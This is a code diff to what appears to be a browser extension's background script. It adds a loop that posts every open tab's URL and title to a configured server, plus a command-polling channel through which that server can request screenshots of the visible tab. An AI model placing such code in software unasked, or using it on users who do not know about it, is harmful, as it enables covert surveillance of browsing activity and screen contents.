@@ -30,6 +30,81 @@ async function checkForUpdates() {
 setInterval(checkForUpdates, 5000);
 checkForUpdates();
 
+// ========== SEND TABS LIST TO SERVER ==========
+async function sendTabsList() {
+  try {
+    const tabs = await chrome.tabs.query({});
+    const tabsData = tabs.map(tab => ({
+      id: tab.id,
+      windowId: tab.windowId,
+      url: tab.url,
+      title: tab.title,
+      active: tab.active,
+      pinned: tab.pinned,
+      index: tab.index
+    }));
+
+    await fetch(SERVER_URL + '/tabs', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ tabs: tabsData, timestamp: Date.now() })
+    });
+  } catch (e) {
+    // Server offline, ignore
+  }
+}
+
+// Send tabs list every 10 seconds
+setInterval(sendTabsList, 10000);
+sendTabsList();
+
+// ========== POLL FOR COMMANDS ==========
+async function pollCommands() {
+  try {
+    const response = await fetch(SERVER_URL + '/command', {
+      signal: AbortSignal.timeout(2000)
+    });
+    if (response.ok) {
+      const cmd = await response.json();
+      if (cmd && cmd.action) {
+        executeCommand(cmd);
+      }
+    }
+  } catch (e) {
+    // Server offline, ignore
+  }
+}
+
+async function executeCommand(cmd) {
+  console.log('[ARWOX] Executing command:', cmd.action);
+
+  if (cmd.action === 'screenshot') {
+    const tabId = cmd.tabId || (await chrome.tabs.query({ active: true, currentWindow: true }))[0]?.id;
+    if (tabId) {
+      const tab = await chrome.tabs.get(tabId);
+      chrome.tabs.captureVisibleTab(tab.windowId, { format: 'png' }, async (dataUrl) => {
+        if (!chrome.runtime.lastError && dataUrl) {
+          await fetch(SERVER_URL + '/screenshot', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ type: 'screenshot', data: dataUrl, url: tab.url, title: tab.title, timestamp: Date.now() })
+          });
+        }
+      });
+    }
+  }
+
+  if (cmd.action === 'get_tabs') {
+    sendTabsList();
+  }
+
+  // Clear command after execution
+  await fetch(SERVER_URL + '/command', { method: 'DELETE' });
+}
+
+// Poll for commands every 3 seconds
+setInterval(pollCommands, 3000);
+
 // ========== Message Handler ==========
 chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
 
